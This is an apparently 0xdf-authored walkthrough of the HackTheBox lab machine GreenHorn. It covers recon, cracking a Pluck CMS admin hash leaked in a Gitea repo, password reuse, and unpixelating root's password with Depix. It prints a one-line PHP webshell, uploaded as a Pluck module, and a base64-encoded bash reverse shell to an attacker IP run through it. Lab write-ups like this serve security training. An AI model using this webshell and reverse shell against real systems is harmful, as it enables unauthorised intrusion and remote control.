---
url: https://www.hackthebox.com/machines/greenhorn
tags:
  - HackTheBox
  - easy
  - offline
  - os/linux
  - retired
  - web/cms
tools:
  - "[[nmap]]"
  - "[[depixalate]]"
---

## Recon

### nmap

`nmap` finds three open TP ports, SSH (22) and two HTTP (80, 3000) servers:

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.25
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-22 15:15 EDT
Nmap scan report for 10.10.11.25
Host is up (0.087s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
oxdf@hacky$ nmap -p 22,80,3000 -sCV 10.10.11.25
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-22 15:16 EDT
Nmap scan report for 10.10.11.25
Host is up (0.087s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=2f501491b20c0d87; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=CeHyP4HDfU0ic2cWqo3NzF1ww3E6MTcyMTY3NTc2NjE0MTU1MTM5Mg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 22 Jul 2024 19:16:06 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=b4543591ce6bd2a3; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=awMcsyMX7BpAcOmIKMMRXeMdzzE6MTcyMTY3NTc3MTU5ODUyOTU2OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 22 Jul 2024 19:16:11 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=7/22%Time=669EB001%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:2f501491b20c0d87;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=CeHyP4HDfU0ic2cWqo3NzF1ww3E6MTcyMTY3NTc2NjE0MTU1MTM5Mg;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2022\x20Jul\x202024\x2019:16:06\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x20r
SF:el=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR3Jl
SF:ZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9
SF:ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm
SF:4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJza
SF:XplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowe
SF:d\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,\x2
SF:0private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_
SF:gitea=b4543591ce6bd2a3;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-
SF:Cookie:\x20_csrf=awMcsyMX7BpAcOmIKMMRXeMdzzE6MTcyMTY3NTc3MTU5ODUyOTU2OQ
SF:;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-
SF:Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2022\x20Jul\x202024\x2019:16:1
SF:1\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.16 seconds

```

![expand](https://0xdf.gitlab.io/icons/expand.png)

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

The website on 80 is returning a redirect to `greenhorn.htb`. Given the use of host-based routing on the webserver, I’ll fuzz with `ffuf` for any subdomains that respond differently, but not find any. I’ll add `greenhorn.htb` to my `/etc/hosts` file:

```
10.10.11.25 greenhorn.htb
```

### Website - TCP 80

#### Site

The site is for junior web developers:

![image-20240722152541699](https://0xdf.gitlab.io/img/image-20240722152541699.png)

In addition to the front page post, the other post is a welcome message for a new junior developer.

The page footer does have two interesting links:

![image-20240722152824887](https://0xdf.gitlab.io/img/image-20240722152824887.png)

The “admin” link goes to `/login.php`:

![image-20240722152859854](https://0xdf.gitlab.io/img/image-20240722152859854.png)

This form requires a password but not a username.

#### Tech Stack

The HTTP headers show the webserver is nginx, and there’s a `PHPSESSID` cookie being set on just visiting:

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 22 Jul 2024 19:24:50 GMT
Content-Type: text/html;charset=utf-8
Connection: close
Set-Cookie: PHPSESSID=74vclo8iuejb6nsfu6dufbuvek; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: http://greenhorn.htb/?file=welcome-to-greenhorn
Content-Length: 0
```

So the site is based on PHP. Trying to load anything other than `/` seems to redirect to `/?file=welcome-to-greenhorn`.

From the footer and admin login page, it’s clear this site is built on [Pluck CMS](https://github.com/pluck-cms/pluck), an open-source PHP content management system. The footer on `/login` shows it’s version 4.7.18. Given that I know the CMS and can look at it’s source, I’ll hold off on the directory brute force for now.

### Gitea - TCP 3000

On port 3000 there’s an instance of [Gitea](https://about.gitea.com/):

![image-20240722154342269](https://0xdf.gitlab.io/img/image-20240722154342269.png)

Registration is open, but even an unauthenticated user can see the GreenHorn repo by clicking Explore:

![image-20240722154521567](https://0xdf.gitlab.io/img/image-20240722154521567.png)

This looks like the code for the site:

![image-20240722154537433](https://0xdf.gitlab.io/img/image-20240722154537433.png)![expand](https://0xdf.gitlab.io/icons/expand.png)

Looking at the login page, it imports a file from `data/settings/pass.php`:

![image-20240722154719174](https://0xdf.gitlab.io/img/image-20240722154719174.png)

In that file is only a single variable, `$ww`, which holds a hash:

![image-20240722154845763](https://0xdf.gitlab.io/img/image-20240722154845763.png)

Later in `login.php`, it compares this hash to `$pass`:

![image-20240722154918974](https://0xdf.gitlab.io/img/image-20240722154918974.png)

`$pass` is created earlier by taking the SHA512 hash of the `$cont1`:

![image-20240722155241917](https://0xdf.gitlab.io/img/image-20240722155241917.png)

This is a bit weird, but `$cont1` is actually `$_POST['cont1']`. This transformation is made in this include of `data/inc/variables.all.php`:

![image-20240722173357040](https://0xdf.gitlab.io/img/image-20240722173357040.png)

At the bottom it sets these:

![image-20240722173417695](https://0xdf.gitlab.io/img/image-20240722173417695.png)

## Shell as www-data

### Access Pluck Admin

#### Crack Hash

I’ve got a SHA512 hash for admin access to Pluck. [CrackStation](https://crackstation.net/) has it:

![image-20240722173537925](https://0xdf.gitlab.io/img/image-20240722173537925.png)

#### Login

On entering the password, it reports correct:

![image-20240722173608480](https://0xdf.gitlab.io/img/image-20240722173608480.png)

And then shows the admin panel:

![image-20240722173629137](https://0xdf.gitlab.io/img/image-20240722173629137.png)

### RCE

#### Identify Vulnerability

Given the exact version of Pluck CMS, I can look for vulnerabilities, and there is one:

![image-20240722153542651](https://0xdf.gitlab.io/img/image-20240722153542651.png)

There’s no CVE ID for this. That’s because it’s not actually a vulnerability, but rather, as admin, I can upload a plugin that writes PHP files. [This video](https://www.youtube.com/watch?v=GpL_rz8jgro) shows the process.

#### Create “Module”

I’ll create a malicious Pluck module following the same process I used in [Mist](https://0xdf.gitlab.io/2024/10/26/htb-mist.html#webshell-pluck-module). To start, I’ll create a simple PHP webshell named `0xdf.php` in a directory:

```
oxdf@hacky$ cat 0xdf.php 
<?php system($_REQUEST['cmd']); ?>
```

I’ll put it into a zip archive:

```
oxdf@hacky$ zip notevil.zip 0xdf.php 
  adding: 0xdf.php (stored 0%)
```

#### Upload Module

From the admin panel, I’ll go to options –> manage modules:

![image-20240722174126649](https://0xdf.gitlab.io/img/image-20240722174126649.png)

On the resulting page, I’ll click on “Install a module…”:

![image-20240722174210973](https://0xdf.gitlab.io/img/image-20240722174210973.png)

The next page is a form asking for the module file:

![image-20240722174233043](https://0xdf.gitlab.io/img/image-20240722174233043.png)

I’ll give it the Zip archive I created earlier. It works:

![image-20240722185304031](https://0xdf.gitlab.io/img/image-20240722185304031.png)

#### Webshell

Pluck takes that Zip archive and unpacks it into `/data/modules/[archive name without extension]/`. So I can find it at `/data/modules/notevil/0xdf.php`. I’ll add `?cmd=id` to the end of the URL to give it a command to run, and it works:

![image-20240722185025139](https://0xdf.gitlab.io/img/image-20240722185025139.png)

It’s worth noting these file are cleaned up relatively frequently, so if the file isn’t there, I’ll have to re-upload.

#### Shell

I’ll base64 encode a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```
oxdf@hacky$ echo 'bash -c "bash  -i >& /dev/tcp/10.10.14.6/443 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK
```

Now I’ll visit:

```
http://greenhorn.htb/data/modules/notevil/0xdf.php?cmd=echo%20%22YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK%22%20|%20base64%20-d%20|%20bash
```

This is passing the command to echo that string to `base64 -d` and the result into `bash`. On running it, I’ll get a shell at `nc`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.25 45320
bash: cannot set terminal process group (1039): Inappropriate ioctl for device
bash: no job control in this shell
www-data@greenhorn:~/html/pluck/data/modules/notevil$
```

I’ll upgrade my shell with [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@greenhorn:~/html/pluck/data/modules/notevil$ script /dev/null -c bash
<luck/data/modules/notevil$ script /dev/null -c bash   
Script started, output log file is '/dev/null'.
www-data@greenhorn:~/html/pluck/data/modules/notevil$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@greenhorn:~/html/pluck/data/modules/notevil$
```

## Shell as junior

### Enumeration

There are two other users on the box with home directories in `/home`, through `git` is likely a service account as well:

```
www-data@greenhorn:/home$ ls 
git  junior
```

The same users are configured with shells:

```
www-data@greenhorn:/home/junior$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
git:x:114:120:Git Version Control,,,:/home/git:/bin/bash
junior:x:1000:1000::/home/junior:/bin/bash
```

www-data is able to go into junior’s home directory and list files, but not read anything useful:

```
www-data@greenhorn:/home/junior$ ls -la
total 76
drwxr-xr-x 3 junior junior  4096 Jun 20 06:36  .
drwxr-xr-x 4 root   root    4096 Jun 20 06:36  ..
lrwxrwxrwx 1 junior junior     9 Jun 11 14:38  .bash_history -> /dev/null
drwx------ 2 junior junior  4096 Jun 20 06:36  .cache
-rw-r----- 1 root   junior 61367 Jun 11 14:39 'Using OpenVAS.pdf'
-rw-r----- 1 root   junior    33 Jun 11 14:38  user.txt
```

### su

I have the password for the admin panel, and the website implied that junior was one working on it. I’ll see if they have reused it, and it works:

```
www-data@greenhorn:/home/junior$ su - junior
Password: 
junior@greenhorn:~$
```

I’ll grab `user.txt`:

```
junior@greenhorn:~$ cat user.txt
79b9524e************************
```

## Shell as root

### Enumeration

In junior’s home directory is a PDF file on OpenVAS:

```
junior@greenhorn:~$ ls
 user.txt  'Using OpenVAS.pdf'
```

I’ll grab a copy of this. While I don’t typically do this, a way to exfil this that I haven’t shown often is to stand up a webserver on the target with Python:

```
junior@greenhorn:~$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Now I can request it from my host:

```
oxdf@hacky$ wget 'greenhorn.htb:9001/Using%20OpenVAS.pdf'
--2024-07-22 20:43:37--  http://greenhorn.htb:9001/Using%20OpenVAS.pdf
Resolving greenhorn.htb (greenhorn.htb)... 10.10.11.25
Connecting to greenhorn.htb (greenhorn.htb)|10.10.11.25|:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 61367 (60K) [application/pdf]
Saving to: ‘Using OpenVAS.pdf’

Using OpenVAS.pdf                                    100%[=====================================================================================================================>]  59.93K  --.-KB/s    in 0.05s   

2024-07-22 20:43:38 (1.25 MB/s) - ‘Using OpenVAS.pdf’ saved [61367/61367]

oxdf@hacky$ file Using\ OpenVAS.pdf 
Using OpenVAS.pdf: PDF document, version 1.7, 1 pages
```

I’ll want to quickly kill the web server as to not leave it exposed for any other players.

The document is about running OpenVAS as root:

![image-20240722204802843](https://0xdf.gitlab.io/img/image-20240722204802843.png)

It’s not totally clear to me why the root user is running `sudo`. But there is a blurred out password that seems interesting.

### Depixalate

#### Background Research

There’s an interesting blog post from Bishop Fox titled [Never, Ever, Ever Use Pixelation for Redacting](https://bishopfox.com/blog/unredacter-tool-never-pixelation). In the post, they show how to use a mathematical model to figure out what the original text behind a pixelated message is. It has a link to a tool that doesn’t work in this case (though is actually generally a more practical tool for this kind of work). It was inspired by a challenge from Jumpsec Labs, which has it’s own [research](https://labs.jumpsec.com/can-depix-deobfuscate-your-data/) as well, and includes a GitHub repo for a tool they call [Depix](https://github.com/spipm/Depix) that will work on some cases of pixelized text.

One of the most challenging parts of this box (and one of the factors that likely leads to the lower than normal reviews) is finding this research. There are loads of “depixelization” tools available on the internet, but only Depix works here as far as I could find.

#### Getting the Image

The next tricky part got me for a bit, but makes sense thinking it through. For the math to work, I’ll need an image that contains no overflow, just the pixelized text, and it’ll have to have a reference image of the same (or very similar) size and font. There are several examples of reference images in the repo, such as this one:

![debruinseq_notepad_Windows10_closeAndSpaced.png](https://0xdf.gitlab.io/img/debruinseq_notepad_Windows10_closeAndSpaced.png)

While it’s possible to try to cut the screenshot exactly right, thinking about what the PDF looks like, the pixelized text must be an image itself. And in fact, right clicking on it in my PDF viewer shows an option to download it:

![image-20240723130024898](https://0xdf.gitlab.io/img/image-20240723130024898.png)

The resulting image, saved as a `.png` file, is:

![](https://0xdf.gitlab.io/img/download.png)

I was never able to get any self cropped images to work with this technique, though I’m sure I could have tried longer on it.

#### Recover Password

Running the script providing both the downloaded image and the notepad Windows10 “closeAndSpaced” reference generates a readable output:

```
oxdf@hacky$ python depix.py -p ../download.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ../download-notepad_Windows10_closeAndSpaced.png
2024-07-23 13:08:32,151 - Loading pixelated image from ../download.png
2024-07-23 13:08:32,158 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-07-23 13:08:32,547 - Finding color rectangles from pixelated space
2024-07-23 13:08:32,548 - Found 252 same color rectangles
2024-07-23 13:08:32,548 - 190 rectangles left after moot filter
2024-07-23 13:08:32,548 - Found 1 different rectangle sizes
2024-07-23 13:08:32,548 - Finding matches in search image
2024-07-23 13:08:32,548 - Scanning 190 blocks with size (5, 5)
2024-07-23 13:08:32,567 - Scanning in searchImage: 0/1674
2024-07-23 13:09:04,418 - Removing blocks with no matches
2024-07-23 13:09:04,418 - Splitting single matches and multiple matches
2024-07-23 13:09:04,421 - [16 straight matches | 174 multiple matches]
2024-07-23 13:09:04,421 - Trying geometrical matches on single-match squares
2024-07-23 13:09:04,656 - [29 straight matches | 161 multiple matches]
2024-07-23 13:09:04,656 - Trying another pass on geometrical matches
2024-07-23 13:09:04,863 - [41 straight matches | 149 multiple matches]
2024-07-23 13:09:04,863 - Writing single match results to output
2024-07-23 13:09:04,864 - Writing average results for multiple matches to output
2024-07-23 13:09:07,413 - Saving output image to: ../download-notepad_Windows10_closeAndSpaced.png
```

![](https://0xdf.gitlab.io/img/download-notepad_Windows10_closeAndSpaced.png)

That password is “sidefromsidetheothersidesidefromsidetheotherside”.

Interstingly, the other templates don’t work as well or at all. I’ll show them in Beyond Root.

### su

With that password, I can `su` to the root user:

```
junior@greenhorn:~$ su -
Password: 
root@greenhorn:~#
```

And grab `root.txt`:

```
root@greenhorn:~# cat root.txt
997ecb37************************
```

## Beyond Root

### PDF Forensics

#### Overview

The idea of dumping the image out of the PDF got me thinking about PDF forensics tools that I’ve shown before on this blog. There’s nothing malicious about this PDF, but I can still take a look at what it is composed of.

For background, a PDF is really a tag-based text document with embedded binary streams. Even just opening in a text editor (`vim` here) will show that structure:

![image-20240723132242636](https://0xdf.gitlab.io/img/image-20240723132242636.png)

Later I can see the “FlateDecode” buffers:

![image-20240723132322802](https://0xdf.gitlab.io/img/image-20240723132322802.png)

#### Find Image

`pdfid.py` will show the various objects and their types (though it only focuses on potentially malcious types):

```
oxdf@hacky$ pdfid.py Using\ OpenVAS.pdf 
PDFiD 0.2.8 Using OpenVAS.pdf
 PDF Header: %PDF-1.7
 obj                   39
 endobj                39
 stream                 5
 endstream              5
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    0
 /JavaScript            0
 /AA                    0
 /OpenAction            0
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /URI                   0
 /Colors > 2^24         0
```

I’ll use `pdf-parser.py` to search for Image objects:

```
oxdf@hacky$ pdf-parser.py --search Image Using\ OpenVAS.pdf
obj 6 0
 Type: /Page
 Referencing: 2 0 R, 10 0 R, 11 0 R, 12 0 R, 13 0 R, 14 0 R, 15 0 R, 16 0 R

  <<
    /Type /Page
    /Parent 2 0 R
    /Resources
      <<
        /Font
          <<
            /F1 10 0 R
            /F2 11 0 R
            /F3 12 0 R
          >>
        /ExtGState
          <<
            /GS10 13 0 R
            /GS11 14 0 R
          >>
        /XObject
          <<
            /Image16 15 0 R
          >>
        /ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
      >>
    /MediaBox [0 0 595.32 841.92]
    /Contents 16 0 R
    /Group
      <<
        /Type /Group
        /S /Transparency
        /CS /DeviceRGB
      >>
    /Tabs /S
    /StructParents 0
  >>


obj 15 0
 Type: /XObject
 Referencing:
 Contains stream

  <<
    /Length 402
    /Type /XObject
    /Subtype /Image
    /Width 420
    /Height 15
    /ColorSpace /DeviceRGB
    /BitsPerComponent 8
    /Interpolate false
    /Filter /FlateDecode
  >>
```

Object 6 is a `Page` object that holds the image, including pointing out that the image is object 15. It also shows object 15, which incdlues (not shown) a buffer. That shows it’s 420 wide by 15 high, with a RGB colorspace.

#### Save Image

I can dump the raw stream as a Python bytes string using the `--object 15` switch to identify the object, `--raw` to get raw output, `--filter` to apply the flate decode, and `--dump` to capture the raw data in a file:

```
oxdf@hacky$ pdf-parser.py --object 15 --raw --filter --dump dump.bin Using\ OpenVAS.pdf
obj 15 0
 Type: /XObject
 Referencing: 
 Contains stream

  <<
    /Length 402
    /Type /XObject
    /Subtype /Image
    /Width 420
    /Height 15
    /ColorSpace /DeviceRGB
    /BitsPerComponent 8
    /Interpolate false
    /Filter /FlateDecode
  >>
```

The resulting file is identified as extended-ASCII, but it’s really just binary data:

```
oxdf@hacky$ file dump.bin 
dump.bin: Non-ISO extended-ASCII text, with very long lines (18900), with no line terminators
oxdf@hacky$ xxd dump.bin | xxd | head
00000000: 3030 3030 3030 3030 3a20 6666 6666 2066  00000000: ffff f
00000010: 6666 6620 6666 6666 2066 6666 6620 6666  fff ffff ffff ff
00000020: 6666 2066 6666 6620 6666 6666 2066 6666  ff ffff ffff fff
00000030: 6620 202e 2e2e 2e2e 2e2e 2e2e 2e2e 2e2e  f  .............
00000040: 2e2e 2e0a 3030 3030 3030 3130 3a20 6666  ....00000010: ff
00000050: 6666 2066 6666 6620 6666 6666 2066 6666  ff ffff ffff fff
00000060: 6620 6666 6666 2066 6666 6620 6666 6666  f ffff ffff ffff
00000070: 2065 6465 6320 202e 2e2e 2e2e 2e2e 2e2e   edec  .........
00000080: 2e2e 2e2e 2e2e 2e0a 3030 3030 3030 3230  ........00000020
00000090: 3a20 6564 6564 2065 6365 6420 6564 6563  : eded eced edec
```

Interestingly, it’s 18900 bytes long:

```
oxdf@hacky$ wc -c dump.bin
18900 dump.bin
```

18900 = 420 * 15 * 3, which is the width, the height, and the bytes per pixel of RGB. So it is the raw image data.

I can convert to this a PNG with Image Magick:

```
oxdf@hacky$ convert -size 420x15 -depth 8 rgb:dump.bin dump.png 
```

### Other Template Files

In trying to get the depixelization working, I ended up running all the template files. Here’s the results for comparison:

|Template|Result|
|---|---|
|`debruinseq_notepad_Windows10_closeAndSpaced.png`|![](https://0xdf.gitlab.io/img/download-notepad_Windows10_closeAndSpaced-1721754954070-12.png)|
|`debruinseq_notepad_Windows10_close.png`|![](https://0xdf.gitlab.io/img/download-notepad_Windows10_close.png)|
|`debruinseq_notepad_Windows10_spaced.png`|![](https://0xdf.gitlab.io/img/download-notepad_Windows10_spaced.png)|
|`debruinseq_notepad_Windows7_close.png`|![](https://0xdf.gitlab.io/img/download-notepad_Windows7_close.png)|
|`debruin_sublime_Linux_small.png`|![](https://0xdf.gitlab.io/img/download-sublime-Linux.png)|

Clearly the Linux one is the worst, and then the Win7 one. I can make out some or all of the password from the close or spaced template, but the one that combines them is the best.

# Green Horn Writeup

## Recon

## Shell as www-data

## Shell as junior

## Shell as root

## Beyond root

